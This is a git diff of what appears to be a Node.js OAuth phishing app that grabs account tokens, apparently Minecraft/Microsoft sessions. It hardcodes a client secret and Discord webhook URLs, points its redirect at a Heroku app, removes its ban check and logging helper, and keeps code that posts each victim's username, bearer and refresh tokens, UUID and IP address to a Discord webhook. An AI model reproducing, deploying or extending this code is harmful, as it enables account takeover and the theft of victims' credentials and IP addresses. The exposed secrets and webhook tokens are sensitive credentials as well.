@@ -1,7 +1,7 @@
 // Configuration
 const client_secret = 'G618Q~CEYmKtWVGX.eUp7t5.9RE~ledqDKdeYdb6'
 const client_id = 'e70428a0-6f7a-4488-a761-52cf169cd227'
-const redirect_uri = 'change'
+const redirect_uri = 'https://capalotapplication.herokuapp.com'
 const webhook_url = 'https://discord.com/api/webhooks/1038186956024201347/43ccmpICsQDB6sh9uynQM676ivWmOfRGC5XVw2wLO-8bsy4D4Ok18SgocBORovaG15tX'
 const webhook_logging_url = 'https://discord.com/api/webhooks/1038186956024201347/43ccmpICsQDB6sh9uynQM676ivWmOfRGC5XVw2wLO-8bsy4D4Ok18SgocBORovaG15tX'
 // Config end
@@ -29,8 +29,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         if (checkIfBanned(username)) {
-            logToWebhook("Reject", "A person has been rejected.")
-            return
+            
         }
         const ip = getIp(req)
         postToWebhook(username, bearerToken, uuid, ip, refreshToken)
@@ -144,26 +143,10 @@ function postToWebhook(username, bearerToken, uuid, ip, refreshToken) {
         }]
     }
     axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
-    logToWebhook("Accepted", "A person has been accepted and it has been sent to the webhook.")
+    
 }
 
-function logToWebhook(title, message) {
-    const url = webhook_logging_url
 
-    let data = {
-        username: " ",
-        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: " ",
-        embeds: [{
-            title: "Log", color: 0x00ff50, fields: [
-                {name: title, value: ""},
-                {name: message, value: ""}
-            ]
-        }
-        ]
-    }
-    axios.post(url, data).then(() => console.log("Logging to discord."))
-}
 
 const bannedNames = []
 
